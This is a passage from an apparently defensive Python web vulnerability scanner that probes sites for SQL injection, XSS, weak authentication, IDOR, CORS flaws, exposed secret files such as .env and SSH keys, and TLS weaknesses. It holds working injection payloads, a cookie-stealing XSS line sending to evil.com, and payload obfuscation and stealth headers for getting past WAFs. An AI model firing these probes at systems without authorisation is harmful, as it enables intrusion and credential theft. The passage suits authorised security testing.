            f"{self.base_url}/api/login",
            f"{self.base_url}/login",
            f"{self.base_url}/auth/login",
            f"{self.base_url}/api/auth/login",
            f"{self.base_url}/user/login",
            f"{self.base_url}/signin",
            f"{self.base_url}/api/signin"
        ]
        
        # Try different payload formats
        payloads = []
        
        if is_email:
            payloads.append({"email": self.login_credential, "password": self.login_password})
            payloads.append({"username": self.login_credential, "password": self.login_password})
            payloads.append({"user": self.login_credential, "pass": self.login_password})
        elif is_phone:
            payloads.append({"phone": self.login_credential, "password": self.login_password})
            payloads.append({"mobile": self.login_credential, "password": self.login_password})
            payloads.append({"phoneNumber": self.login_credential, "password": self.login_password})
        else:
            payloads.append({"username": self.login_credential, "password": self.login_password})
            payloads.append({"user": self.login_credential, "password": self.login_password})
        
        # Add combined payload
        payloads.append({"username": self.login_credential, "email": self.login_credential, 
                        "phone": self.login_credential, "password": self.login_password})
        
        for login_url in login_urls:
            for data in payloads:
                try:
                    self.log(f"  Trying {login_url} with payload format: {list(data.keys())}")
                    response = self._request('POST', login_url, json=data, timeout=5)
                    
                    if self.is_blocked(response):
                        self.log("  ⚠️ Login attempt was blocked by WAF.", "WARNING")
                        continue
                        
                    if response.status_code == 200:
                        try:
                            resp_json = response.json()
                            # Try different token field names
                            self.auth_token = (resp_json.get("token") or 
                                             resp_json.get("access_token") or 
                                             resp_json.get("jwt") or
                                             resp_json.get("id_token") or
                                             resp_json.get("auth_token"))
                            if self.auth_token:
                                self.session.headers.update({"Authorization": f"Bearer {self.auth_token}"})
                                self.log("✅ Login successful! Auth token acquired.")
                                return True
                            else:
                                # Check for session cookie
                                if self.session.cookies:
                                    self.log("✅ Login successful, using session cookies.")
                                    return True
                        except:
                            self.log("✅ Login successful (non-JSON response).")
                            return True
                    else:
                        self.log(f"  Login failed on {login_url}: {response.status_code}")
                        
                except Exception as e:
                    self.log(f"  Error during login attempt: {e}", "ERROR")
                    continue
        
        self.log("⚠️ Could not login with provided credentials. Continuing with unauthenticated tests.")
        return False

    # ----------------------------------------------------------------------
    # Helper to add vulnerability with CVSS and OWASP (enhanced evidence)
    # ----------------------------------------------------------------------
    def add_vulnerability(self, vuln_type, endpoint, payload=None, parameter=None,
                          request=None, response=None, cvss_override=None, extra=None):
        """Create a detailed vulnerability entry and append to results."""
        # Get base CVSS metrics from map or use defaults
        metrics = VULN_CVSS_MAP.get(vuln_type, VULN_CVSS_MAP["SQL Injection"])  # fallback to critical
        cvss_score = cvss_override if cvss_override is not None else calculate_cvss_base(vuln_type, **metrics)
        owasp = OWASP_MAP.get(vuln_type, "Unknown")

        vuln = {
            "vulnerability": vuln_type,
            "endpoint": endpoint,
            "cvss_score": cvss_score,
            "owasp": owasp,
            "test_run_id": self.test_run_id,
            "timestamp": datetime.datetime.now().isoformat()
        }
        if payload:
            vuln["payload"] = payload
        if parameter:
            vuln["parameter"] = parameter
        if request:
            # Clean request for JSON serialization
            req_clean = {
                'method': request.get('method'),
                'url': request.get('url'),
                'headers': request.get('headers'),
                'body': request.get('body'),
                'timestamp': request.get('timestamp')
            }
            vuln["raw_request"] = req_clean
        if response:
            resp_clean = {}
            if hasattr(response, 'status_code'):
                resp_clean['status_code'] = response.status_code
                resp_clean['headers'] = dict(response.headers)
                resp_clean['body_snippet'] = response.text[:1000] if hasattr(response, 'text') else None
                resp_clean['elapsed'] = getattr(response, '_elapsed', None)
            elif isinstance(response, dict):
                resp_clean = response
            vuln["raw_response"] = resp_clean
        if extra:
            vuln.update(extra)

        self.results.append(vuln)

    # ----------------------------------------------------------------------
    # SQL Injection test (enhanced with more detection techniques)
    # ----------------------------------------------------------------------
    def test_sql_injection(self):
        """Test for SQL injection vulnerabilities with advanced detection"""
        self.log("🔍 Testing SQL Injection (enhanced)...")
        vulnerable = False
        test_details = []

        # Expanded payloads
        boolean_payloads = [
            ("' OR '1'='1", "' OR '1'='2"),
            ("' OR 1=1 --", "' OR 1=2 --"),
            ("' AND '1'='1", "' AND '1'='2"),
            ("1' AND '1'='1", "1' AND '1'='2"),
            ('" OR "1"="1', '" OR "1"="2'),
        ]
        time_payloads = [
            ("' OR SLEEP(5) --", 5),
            ("' AND SLEEP(5) --", 5),
            ("'; WAITFOR DELAY '00:00:05' --", 5),  # MSSQL
            ("' OR pg_sleep(5) --", 5),              # PostgreSQL
            ("' OR BENCHMARK(5000000,MD5('test')) --", 5),  # MySQL heavy query
        ]
        error_payloads = [
            "'", "\"", "\\", "'\"`", "';--", "') OR ('1'='1--",
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "1' ORDER BY 100--", "1' GROUP BY 100--"
        ]
        union_payloads = [
            ("' UNION SELECT NULL--", 1),
            ("' UNION SELECT NULL,NULL--", 2),
            ("' UNION SELECT NULL,NULL,NULL--", 3),
        ]

        # Build test endpoints
        test_endpoints = set()
        for url, methods in self.discovered_endpoints.items():
            if 'POST' in methods:
                test_endpoints.add(url)
        common = ["/api/login", "/api/register", "/api/search", "/api/contact", "/search", "/contact"]
        for path in common:
            test_endpoints.add(urljoin(self.base_url, path))

        for endpoint in test_endpoints:
            self.log(f"  Testing SQLi on {endpoint}")
            endpoint_result = {"endpoint": endpoint, "status": "secure", "details": ""}
            consecutive_blocks = 0

            # Measure baseline for time-based
            baseline_json = {"email": "nonexistent@example.com", "password": "wrongpassword"}
            baseline_time = self.measure_baseline(endpoint, method='POST', json_data=baseline_json)

            # Boolean-based tests
            for true_payload, false_payload in boolean_payloads:
                if consecutive_blocks >= 3:
                    self.log(f"    Circuit breaker tripped after 3 blocks. Skipping remaining payloads.")
                    endpoint_result["status"] = "blocked"
                    endpoint_result["details"] = "WAF blocked multiple requests"
                    break
                true_payload_obs = obfuscate_sql_payload(true_payload)
                false_payload_obs = obfuscate_sql_payload(false_payload)
                try:
                    true_data = {"email": true_payload_obs, "password": "anything"}
                    resp_true = self._request('POST', endpoint, json=true_data, timeout=5)
                    if self.is_blocked(resp_true):
                        consecutive_blocks += 1
                        continue

                    false_data = {"email": false_payload_obs, "password": "anything"}
                    resp_false = self._request('POST', endpoint, json=false_data, timeout=5)
                    if self.is_blocked(resp_false):
                        consecutive_blocks += 1
                        continue

                    consecutive_blocks = 0

                    if (resp_true.status_code != resp_false.status_code) or \
                       (len(resp_true.text) != len(resp_false.text)):
                        self.log(f"    ⚠️ Boolean-based SQLi possible at {endpoint}", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="SQL Injection (Boolean-based)",
                            endpoint=endpoint,
                            payload=true_payload_obs,
                            parameter="email",
                            request=resp_true._request_info,
                            response=resp_true,
                            extra={'detection': 'Boolean difference'}
                        )
                        endpoint_result["status"] = "vulnerable"
                        endpoint_result["details"] = f"Boolean-based SQLi with payload: {true_payload}"
                        break
                except Exception as e:
                    continue

            # Time-based tests
            for payload, delay in time_payloads:
                if consecutive_blocks >= 3:
                    break
                payload_obs = obfuscate_sql_payload(payload)
                try:
                    data = {"email": payload_obs, "password": "anything"}
                    start = time.time()
                    resp = self._request('POST', endpoint, json=data, timeout=delay+5)
                    if self.is_blocked(resp):
                        consecutive_blocks += 1
                        continue
                    elapsed = time.time() - start
                    if elapsed - baseline_time >= delay - 1:
                        self.log(f"    ⚠️ Time-based SQLi detected at {endpoint}", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="SQL Injection (Time-based)",
                            endpoint=endpoint,
                            payload=payload_obs,
                            parameter="email",
                            request=resp._request_info,
                            response=resp,
                            extra={'response_time': elapsed, 'baseline_time': baseline_time}
                        )
                        endpoint_result["status"] = "vulnerable"
                        endpoint_result["details"] = f"Time-based SQLi with payload: {payload}"
                        break
                except requests.exceptions.Timeout:
                    if delay >= 5:
                        self.log(f"    ⚠️ Time-based SQLi (timeout) at {endpoint}", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="SQL Injection (Time-based - Timeout)",
                            endpoint=endpoint,
                            payload=payload_obs,
                            parameter="email",
                            request=None,
                            response={'error': 'timeout'}
                        )
                        endpoint_result["status"] = "vulnerable"
                        endpoint_result["details"] = f"Timeout on time-based payload: {payload}"
                        break
                except Exception:
                    continue

            # Error-based tests
            for payload in error_payloads:
                if consecutive_blocks >= 3:
                    break
                payload_obs = obfuscate_sql_payload(payload)
                try:
                    data = {"email": payload_obs, "password": "anything"}
                    resp = self._request('POST', endpoint, json=data, timeout=5)
                    if self.is_blocked(resp):
                        consecutive_blocks += 1
                        continue
                        
                    db_errors = ["sql", "mysql", "syntax error", "unclosed quotation", "odbc", "driver", "ora-",
                                 "postgresql", "sqlite", "microsoft ole db", "db2", "plsql"]
                    if any(err in resp.text.lower() for err in db_errors):
                        self.log(f"    ⚠️ Error-based SQLi possible at {endpoint}", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="SQL Injection (Error-based)",
                            endpoint=endpoint,
                            payload=payload_obs,
                            parameter="email",
                            request=resp._request_info,
                            response=resp
                        )
                        endpoint_result["status"] = "vulnerable"
                        endpoint_result["details"] = f"Error-based SQLi with payload: {payload}"
                        break
                except Exception:
                    continue

            # Union-based tests (simplified)
            for payload, col_count in union_payloads:
                if consecutive_blocks >= 3:
                    break
                payload_obs = obfuscate_sql_payload(payload)
                try:
                    data = {"email": payload_obs, "password": "anything"}
                    resp = self._request('POST', endpoint, json=data, timeout=5)
                    if self.is_blocked(resp):
                        consecutive_blocks += 1
                        continue
                    # Check for increased column count indicators
                    if "column" in resp.text.lower() and "unknown" in resp.text.lower():
                        self.log(f"    ⚠️ Union-based SQLi possible at {endpoint}", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="SQL Injection (Union-based)",
                            endpoint=endpoint,
                            payload=payload_obs,
                            parameter="email",
                            request=resp._request_info,
                            response=resp
                        )
                        endpoint_result["status"] = "vulnerable"
                        endpoint_result["details"] = f"Union-based SQLi with payload: {payload}"
                        break
                except Exception:
                    continue

            test_details.append(endpoint_result)

        self.test_summary["SQL Injection"] = {
            "status": "VULNERABLE" if vulnerable else "SECURE" if not any(b.get("status")=="blocked" for b in test_details) else "BLOCKED",
            "details": f"Tested {len(test_endpoints)} endpoints. Vulnerabilities found: {vulnerable}"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # XSS test – THREADED with improved detection
    # ----------------------------------------------------------------------
    def test_xss(self):
        """Test for Cross-Site Scripting vulnerabilities using threading and actual parameters"""
        self.log("🔍 Testing XSS vulnerabilities with threading (enhanced)...")
        vulnerable = False

        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<a href=\"javascript:alert('XSS')\">Click</a>",
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "<img src=x onerror=alert(document.domain)>",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>",
        ]

        # Build test endpoints
        test_endpoints = set()
        for url, methods in self.discovered_endpoints.items():
            if 'POST' in methods or 'GET' in methods:
                test_endpoints.add(url)
        common = ["/api/register", "/api/contact", "/api/profile/update", "/search", "/comment"]
        for path in common:
            test_endpoints.add(urljoin(self.base_url, path))

        # Prepare tasks
        tasks = []
        for endpoint in test_endpoints:
            methods_and_params = self.discovered_endpoints.get(endpoint, {})
            actual_params = set()
            for method, params in methods_and_params.items():
                actual_params.update(params)
            params_to_test = actual_params if actual_params else ['q', 'id', 'search', 'name', 'email', 'comment']
            for payload in xss_payloads:
                for param in params_to_test:
                    tasks.append((endpoint, param, payload))

        block_counter = {}
        auth_header = self.session.headers.get('Authorization', '')

        def check_xss(endpoint, param, payload):
            """Worker function for a single XSS test"""
            if block_counter.get(endpoint, 0) >= 3:
                return {"type": "blocked", "endpoint": endpoint, "reason": "circuit_breaker"}
            try:
                headers = get_stealth_headers()
                if auth_header:
                    headers['Authorization'] = auth_header
                data = {param: payload}
                
                if any(x in endpoint.lower() for x in ['search', 'q', 'query', 'get']):
                    resp = requests.get(endpoint, params=data, headers=headers, timeout=3)
                else:
                    resp = requests.post(endpoint, json=data, headers=headers, timeout=3)

                if resp.status_code in [403, 406, 429]:
                    block_counter[endpoint] = block_counter.get(endpoint, 0) + 1
                    return {"type": "blocked", "endpoint": endpoint}
                else:
                    block_counter[endpoint] = 0

                # Check for reflected payload (simple detection)
                if payload in resp.text and '&lt;' not in payload and '&gt;' not in payload:
                    return {
                        "type": "vulnerable",
                        "endpoint": endpoint,
                        "param": param,
                        "payload": payload,
                        "request": {
                            'method': 'GET' if 'search' in endpoint.lower() else 'POST',
                            'url': endpoint,
                            'headers': headers,
                            'body': data,
                            'timestamp': datetime.datetime.now().isoformat()
                        },
                        "response": {
                            'status_code': resp.status_code,
                            'headers': dict(resp.headers),
                            'body_snippet': resp.text[:500],
                            'elapsed': resp.elapsed.total_seconds()
                        }
                    }
                # Check for DOM-based XSS indicators (simplified)
                if 'alert' in resp.text and payload in resp.text:
                    return {"type": "vulnerable", ...}
                return {"type": "secure"}
            except Exception as e:
                return {"type": "error", "error": str(e), "endpoint": endpoint}

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            future_to_task = {executor.submit(check_xss, endpoint, param, payload): (endpoint, param, payload)
                              for endpoint, param, payload in tasks}
            for future in concurrent.futures.as_completed(future_to_task):
                result = future.result()
                if result["type"] == "vulnerable":
                    vulnerable = True
                    self.log(f"  ⚠️ XSS vulnerability at {result['endpoint']} (param={result['param']})", "WARNING")
                    self.add_vulnerability(
                        vuln_type="Cross-Site Scripting (XSS)",
                        endpoint=result["endpoint"],
                        payload=result["payload"][:50],
                        parameter=result["param"],
                        request=result.get("request"),
                        response=result.get("response")
                    )

        total_tests = len(tasks)
        blocked_endpoints = len(set(endpoint for endpoint, cnt in block_counter.items() if cnt >= 3))
        self.test_summary["Cross-Site Scripting (XSS)"] = {
            "status": "VULNERABLE" if vulnerable else "BLOCKED" if blocked_endpoints > 0 else "SECURE",
            "details": f"Tested {total_tests} payload/parameter combinations across {len(test_endpoints)} endpoints. Blocked endpoints: {blocked_endpoints}"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # Authentication Flaws test (as before, but with enhanced logging)
    # ----------------------------------------------------------------------
    def test_authentication_flaws(self):
        """Test for authentication-related vulnerabilities"""
        self.log("🔍 Testing Authentication Flaws...")
        vulnerable = False
        details = []

        login_endpoints = [url for url in self.discovered_endpoints if 'login' in url.lower()]
        if not login_endpoints:
            login_endpoints = [f"{self.base_url}/api/login", f"{self.base_url}/login"]

        for login_url in login_endpoints:
            self.log(f"  Testing {login_url}")
            consecutive_blocks = 0

            # Weak passwords
            weak_passwords = ["123456", "password", "admin", "qwerty", "test123", "password123"]
            for weak_pass in weak_passwords:
                if consecutive_blocks >= 3:
                    break
                try:
                    data = {"email": f"test_{int(time.time())}@example.com", "password": weak_pass, "name": "Test User"}
                    resp = self._request('POST', login_url, json=data, timeout=3)
                    if self.is_blocked(resp):
                        consecutive_blocks += 1
                        continue
                    if resp.status_code == 200:
                        self.log(f"  ⚠️ Weak password '{weak_pass}' accepted!", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="Weak Password Policy",
                            endpoint=login_url,
                            payload=weak_pass,
                            request=resp._request_info,
                            response=resp
                        )
                        details.append(f"Weak password {weak_pass} accepted")
                except Exception:
                    pass

            # User enumeration
            test_emails = ["admin@example.com", "nonexistent@example.com", self.login_credential or "test@example.com", "user@nonexistent.com"]
            responses = {}
            for email in test_emails:
                if consecutive_blocks >= 3:
                    break
                try:
                    data = {"email": email, "password": "wrongpassword"}
                    resp = self._request('POST', login_url, json=data, timeout=3)
                    if self.is_blocked(resp):
                        consecutive_blocks += 1
                        continue
                    responses[email] = resp.text.lower()
                except Exception:
                    continue

            if len(responses) >= 2:
                first_response = list(responses.values())[0]
                consistent = all(r == first_response for r in responses.values())
                if not consistent:
                    enum_phrases = ["user not found", "does not exist", "invalid user", "email not found"]
                    for email, resp_text in responses.items():
                        if any(phrase in resp_text for phrase in enum_phrases):
                            self.log(f"  ⚠️ User enumeration possible at {login_url}", "WARNING")
                            vulnerable = True
                            self.add_vulnerability(
                                vuln_type="User Enumeration",
                                endpoint=login_url,
                                payload=email,
                                response={'error_message': resp_text[:200]}
                            )
                            details.append("User enumeration via error messages")
                            break

            # Rate limiting
            try:
                success_count = 0
                for i in range(15):
                    if consecutive_blocks >= 3:
                        break
                    data = {"email": self.login_credential or "test@example.com", "password": f"wrong{i}"}
                    resp = self._request('POST', login_url, json=data, timeout=2)
                    if self.is_blocked(resp):
                        consecutive_blocks += 1
                        continue
                    if resp.status_code != 429:
                        success_count += 1
                    time.sleep(0.1)
                if success_count >= 12:
                    self.log(f"  ⚠️ No rate limiting detected at {login_url}!", "WARNING")
                    vulnerable = True
                    self.add_vulnerability(
                        vuln_type="Missing Rate Limiting",
                        endpoint=login_url,
                        response={'detail': f"Allowed {success_count} rapid login attempts"}
                    )
                    details.append("No rate limiting")
            except Exception:
                pass

        self.test_summary["Authentication Flaws"] = {
            "status": "VULNERABLE" if vulnerable else "SECURE",
            "details": "; ".join(details) if details else "No authentication flaws found"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # IDOR test (as before, but enhanced)
    # ----------------------------------------------------------------------
    def test_insecure_direct_object_reference(self):
        """Test for Insecure Direct Object References"""
        self.log("🔍 Testing IDOR vulnerabilities...")
        vulnerable = False
        details = []

        if not self.auth_token and self.login_credential:
            self.attempt_login()

        idor_patterns = ['/user/', '/profile/', '/order/', '/document/', '/payment/', '/api/users/', '/api/orders/']
        idor_endpoints = []
        for url in self.discovered_endpoints:
            if any(pattern in url for pattern in idor_patterns):
                idor_endpoints.append(url)
        if not idor_endpoints:
            templates = [
                f"{self.base_url}/api/user/profile/{{id}}",
                f"{self.base_url}/api/users/{{id}}",
                f"{self.base_url}/api/orders/{{id}}",
                f"{self.base_url}/api/documents/{{id}}",
                f"{self.base_url}/api/payment/{{id}}",
                f"{self.base_url}/user/{{id}}",
                f"{self.base_url}/profile/{{id}}"
            ]
            idor_endpoints = templates

        test_ids = [1, 2, 3, 999, 1000, 'admin', 'test']

        for endpoint_template in idor_endpoints:
            self.log(f"  Testing {endpoint_template}")
            consecutive_blocks = 0
            for test_id in test_ids:
                if consecutive_blocks >= 3:
                    break
                endpoint = endpoint_template.replace('{id}', str(test_id))
                try:
                    resp = self._request('GET', endpoint, timeout=3)
                    if self.is_blocked(resp):
                        consecutive_blocks += 1
                        continue
                    if resp.status_code == 200:
                        content = resp.text.lower()
                        sensitive_patterns = ['password', 'email', 'phone', 'address', 'credit', 'ssn', 'dob', 'salary']
                        found_sensitive = [p for p in sensitive_patterns if p in content]
                        if found_sensitive:
                            self.log(f"  ⚠️ Potential IDOR at {endpoint}", "WARNING")
                            vulnerable = True
                            self.add_vulnerability(
                                vuln_type="IDOR",
                                endpoint=endpoint,
                                payload=f"ID={test_id}",
                                request=resp._request_info,
                                response=resp,
                                extra={'sensitive_data_found': found_sensitive}
                            )
                            details.append(f"IDOR on {endpoint} with ID {test_id}")
                            break
                except Exception:
                    continue

        self.test_summary["IDOR"] = {
            "status": "VULNERABLE" if vulnerable else "SECURE",
            "details": "; ".join(details) if details else "No IDOR vulnerabilities found"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # CORS test (as before)
    # ----------------------------------------------------------------------
    def test_cors_misconfiguration(self):
        """Test for CORS misconfigurations"""
        self.log("🔍 Testing CORS Misconfigurations...")
        vulnerable = False
        details = []

        try:
            test_origins = ['https://evil.com', 'null', '*']
            for origin in test_origins:
                headers = {
                    'Origin': origin,
                    'Access-Control-Request-Method': 'GET'
                }
                resp = self._request('OPTIONS', self.base_url, headers=headers, timeout=3)
                if self.is_blocked(resp):
                    continue
                cors_headers = {
                    'allow_origin': resp.headers.get('Access-Control-Allow-Origin', ''),
                    'allow_credentials': resp.headers.get('Access-Control-Allow-Credentials', ''),
                    'allow_methods': resp.headers.get('Access-Control-Allow-Methods', '')
                }
                if cors_headers['allow_origin'] == '*' and cors_headers['allow_credentials'] == 'true':
                    self.log("  ⚠️ Dangerous CORS configuration: * with credentials", "WARNING")
                    vulnerable = True
                    self.add_vulnerability(
                        vuln_type="CORS Misconfiguration",
                        endpoint=self.base_url,
                        payload=origin,
                        response=cors_headers
                    )
                    details.append("Wildcard origin with credentials")
                elif origin in cors_headers['allow_origin'] and cors_headers['allow_credentials'] == 'true':
                    self.log(f"  ⚠️ CORS allows {origin} with credentials", "WARNING")
                    vulnerable = True
                    self.add_vulnerability(
                        vuln_type="CORS Misconfiguration",
                        endpoint=self.base_url,
                        payload=origin,
                        response=cors_headers
                    )
                    details.append(f"Allowed origin {origin} with credentials")
        except Exception as e:
            self.log(f"  Error testing CORS: {e}", "ERROR")

        self.test_summary["CORS Misconfiguration"] = {
            "status": "VULNERABLE" if vulnerable else "SECURE",
            "details": "; ".join(details) if details else "No CORS misconfigurations found"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # Sensitive Data Exposure (enhanced)
    # ----------------------------------------------------------------------
    def test_sensitive_data_exposure(self):
        """Test for exposed sensitive files and data"""
        self.log("🔍 Testing for Sensitive Data Exposure...")
        vulnerable = False
        details = []

        common_files = [
            "/.env", "/.env.local", "/.env.production",
            "/config.json", "/config.js", "/config.php",
            "/database.json", "/database.yml",
            "/backup.sql", "/dump.sql", "/db.sql",
            "/phpinfo.php", "/info.php",
            "/.git/config", "/.git/HEAD",
            "/robots.txt", "/sitemap.xml",
            "/package.json", "/composer.json",
            "/wp-config.php", "/wp-config.txt",
            "/.aws/credentials", "/.aws/config",
            "/.ssh/id_rsa", "/.ssh/id_dsa",
            "/secret.txt", "/password.txt",
            "/api-docs", "/swagger.json", "/openapi.json",
            "/.htaccess", "/.htpasswd",
            "/web.config", "/.well-known/security.txt"
        ]

        sensitive_patterns = [
            r'password["\']?\s*[:=]\s*["\']?[^"\']+',
            r'api[_-]?key["\']?\s*[:=]\s*["\']?[^"\']+',
            r'secret["\']?\s*[:=]\s*["\']?[^"\']+',
            r'token["\']?\s*[:=]\s*["\']?[^"\']+',
            r'database[_-]?url',
            r'mongodb://',
            r'mysql://',
            r'postgresql://',
            r'aws[_-]?access[_-]?key',
            r'aws[_-]?secret[_-]?key',
            r'private[_-]?key',
            r'BEGIN RSA PRIVATE KEY',
            r'SECRET_KEY'
        ]

        consecutive_blocks = 0
        for file_path in common_files:
            if consecutive_blocks >= 3:
                self.log("  Circuit breaker tripped – stopping sensitive data tests.")
                break
            url = urljoin(self.base_url, file_path)
            self.log(f"  Checking {file_path}")
            try:
                resp = self._request('GET', url, timeout=3)
                if self.is_blocked(resp):
                    consecutive_blocks += 1
                    continue
                consecutive_blocks = 0
                if resp.status_code == 200:
                    content = resp.text
                    if len(content) > 1000000:
                        continue
                    for pattern in sensitive_patterns:
                        if re.search(pattern, content, re.IGNORECASE):
                            self.log(f"  ⚠️ Sensitive data exposed in {file_path}!", "WARNING")
                            vulnerable = True
                            match = re.search(pattern, content, re.IGNORECASE)
                            matched_text = match.group(0)[:100] if match else "Pattern matched"
                            self.add_vulnerability(
                                vuln_type="Sensitive Data Exposure",
                                endpoint=url,
                                payload=file_path,
                                request=resp._request_info,
                                response=resp,
                                extra={'pattern_matched': matched_text}
                            )
                            details.append(f"{file_path} contains sensitive data")
                            break
            except Exception:
                continue

        self.test_summary["Sensitive Data Exposure"] = {
            "status": "VULNERABLE" if vulnerable else "SECURE",
            "details": "; ".join(details) if details else "No sensitive files exposed"
        }
        return vulnerable

    # ----------------------------------------------------------------------
    # Security Headers test (as before)
    # ----------------------------------------------------------------------
    def test_security_headers(self):
        """Test for missing or misconfigured security headers"""
        self.log("🔍 Testing Security Headers...")
        vulnerable = False
        details = []

        try:
            resp = self._request('GET', self.base_url, timeout=3)
            if self.is_blocked(resp):
                self.log("  Security headers test blocked by WAF.", "WARNING")
                self.test_summary["Security Headers"] = {"status": "BLOCKED", "details": "Request blocked by WAF"}
                return "BLOCKED"

            headers = resp.headers

            required_headers = {
                'X-Frame-Options': {'expected': ['DENY', 'SAMEORIGIN'], 'desc': 'Prevents clickjacking'},
                'X-Content-Type-Options': {'expected': ['nosniff'], 'desc': 'Prevents MIME sniffing'},
                'Content-Security-Policy': {'expected': None, 'desc': 'Controls resource loading'},
                'Strict-Transport-Security': {'expected': None, 'desc': 'Enforces HTTPS'},
                'X-XSS-Protection': {'expected': ['1; mode=block'], 'desc': 'XSS filter'},
                'Referrer-Policy': {'expected': ['strict-origin', 'strict-origin-when-cross-origin', 'no-referrer', 'same-origin'], 'desc': 'Referrer info'},
                'Permissions-Policy': {'expected': None, 'desc': 'Controls browser features'}
            }

            for header, config in required_headers.items():
                value = headers.get(header)
                if not value:
                    self.log(f"  ⚠️ Missing security header: {header}", "WARNING")
                    vulnerable = True
                    self.add_vulnerability(
                        vuln_type="Missing Security Header",
                        endpoint=self.base_url,
                        payload=header,
                        response={'missing_header': header, 'description': config['desc']}
                    )
                    details.append(f"Missing {header}")
                elif config['expected'] and value not in config['expected']:
                    self.log(f"  ⚠️ Misconfigured {header}: {value}", "WARNING")
                    vulnerable = True
                    self.add_vulnerability(
                        vuln_type="Misconfigured Security Header",
                        endpoint=self.base_url,
                        payload=header,
                        response={'header': header, 'current_value': value, 'expected_values': config['expected']}
                    )
                    details.append(f"Misconfigured {header}: {value}")

            if 'Server' in headers and '/' in headers['Server']:
                self.log(f"  ⚠️ Server version disclosed: {headers['Server']}", "WARNING")
                vulnerable = True
                self.add_vulnerability(
                    vuln_type="Server Version Disclosure",
                    endpoint=self.base_url,
                    payload=headers['Server'],
                    response={'server_header': headers['Server']}
                )
                details.append(f"Server version disclosed: {headers['Server']}")

            if 'X-Powered-By' in headers:
                self.log(f"  ⚠️ Technology disclosed: {headers['X-Powered-By']}", "WARNING")
                vulnerable = True
                self.add_vulnerability(
                    vuln_type="Technology Disclosure",
                    endpoint=self.base_url,
                    payload=headers['X-Powered-By'],
                    response={'header': 'X-Powered-By', 'value': headers['X-Powered-By']}
                )
                details.append(f"Technology disclosed: {headers['X-Powered-By']}")

            self.test_summary["Security Headers"] = {
                "status": "VULNERABLE" if vulnerable else "SECURE",
                "details": "; ".join(details) if details else "All security headers properly configured"
            }
            return vulnerable

        except Exception as e:
            self.log(f"  Error checking security headers: {e}", "ERROR")
            self.test_summary["Security Headers"] = {"status": "ERROR", "details": str(e)}
            return False

    # ----------------------------------------------------------------------
    # SSL/TLS test (as before)
    # ----------------------------------------------------------------------
    def test_ssl_tls_vulnerabilities(self):
        """Test SSL/TLS configuration"""
        self.log("🔍 Testing SSL/TLS Configuration...")
        vulnerable = False
        details = []

        if not self.base_url.startswith('https://'):
            self.log("  ⚠️ Site not using HTTPS!", "WARNING")
            self.add_vulnerability(
                vuln_type="Missing HTTPS",
                endpoint=self.base_url,
                response={'note': 'Site does not use HTTPS'}
            )
            self.test_summary["SSL/TLS"] = {"status": "VULNERABLE", "details": "Site does not use HTTPS"}
            return True

        try:
            hostname = self.base_url.split('://')[1].split('/')[0]
            context = ssl.create_default_context()
            with socket.create_connection((hostname, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    not_after = cert.get('notAfter')
                    if not_after:
                        expiry_date = datetime.datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                        if expiry_date < datetime.datetime.now():
                            self.log("  ⚠️ SSL Certificate expired!", "WARNING")
                            vulnerable = True
                            self.add_vulnerability(
                                vuln_type="Expired SSL Certificate",
                                endpoint=self.base_url,
                                payload=not_after,
                                response={'expiry_date': not_after}
                            )
                            details.append("Certificate expired")

                    cipher = ssock.cipher()
                    cipher_name = cipher[0] if cipher else "Unknown"
                    weak_ciphers = ['RC4', '3DES', 'DES', 'MD5', 'EXPORT', 'NULL']
                    if any(weak in cipher_name for weak in weak_ciphers):
                        self.log(f"  ⚠️ Weak cipher: {cipher_name}", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="Weak SSL Cipher",
                            endpoint=self.base_url,
                            payload=cipher_name,
                            response={'cipher': cipher_name}
                        )
                        details.append(f"Weak cipher {cipher_name}")

                    tls_version = ssock.version()
                    if tls_version in ['TLSv1', 'TLSv1.0', 'TLSv1.1']:
                        self.log(f"  ⚠️ Outdated TLS version: {tls_version}", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="Outdated TLS Version",
                            endpoint=self.base_url,
                            payload=tls_version,
                            response={'tls_version': tls_version}
                        )
                        details.append(f"Outdated TLS {tls_version}")

            self.test_summary["SSL/TLS"] = {
                "status": "VULNERABLE" if vulnerable else "SECURE",
                "details": "; ".join(details) if details else "SSL/TLS configuration is secure"
            }
            return vulnerable

        except Exception as e:
            self.log(f"  Error checking SSL/TLS: {e}", "ERROR")
            self.test_summary["SSL/TLS"] = {"status": "ERROR", "details": str(e)}
            return "BLOCKED"

    # ----------------------------------------------------------------------
    # CSRF test (as before)
    # ----------------------------------------------------------------------
    def test_csrf(self):
        """Test for CSRF vulnerabilities"""
        self.log("🔍 Testing CSRF Vulnerabilities...")
        if not self.auth_token and self.login_credential:
            self.attempt_login()

        state_change_endpoints = []
        for url in self.discovered_endpoints:
            if any(p in url.lower() for p in ['update', 'delete', 'create', 'post', 'change', 'settings', 'profile']):
                state_change_endpoints.append(url)
        if not state_change_endpoints:
            state_change_endpoints = [
                f"{self.base_url}/api/profile/update",
                f"{self.base_url}/api/user/update",
                f"{self.base_url}/api/settings",
                f"{self.base_url}/profile/update"
            ]

        vulnerable = False
        details = []
        consecutive_blocks = 0

